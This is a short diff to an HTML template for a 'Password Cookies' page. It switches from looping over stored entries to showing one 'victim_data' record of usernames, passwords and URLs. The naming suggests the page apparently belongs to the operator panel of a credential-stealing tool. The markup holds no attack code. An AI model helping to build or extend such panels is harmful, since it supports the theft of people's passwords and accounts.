@@ -36,15 +36,13 @@
         <main class="info-grid">
             <h1 class="title">Password Cookies</h1>
             <div class="grid-container">
-                {% for item in passcookies_data %}
-                    <div class="info-box gray">
-                        <div>
-                            <p><strong>Username:</strong> {{ item.username }}</p>
-                            <p><strong>Password:</strong> {{ item.password }}</p>
-                            <p><strong>Url:</strong> <a href="{{ item.url }}" target="_blank">{{ item.url }}</a></p>
-                        </div>
+                <div class="info-box gray">
+                    <div>
+                        <p><strong>Username:</strong> {{ victim_data.usernames }}</p>
+                        <p><strong>Password:</strong> {{ victim_data.passwords }}</p>
+                        <p><strong>Url:</strong> <a href="{{ victim_data.url }}" target="_blank">{{ victim_data.url }}</a></p>
                     </div>
-                {% endfor %}
+                </div>
             </div>
         </main>
     </div>
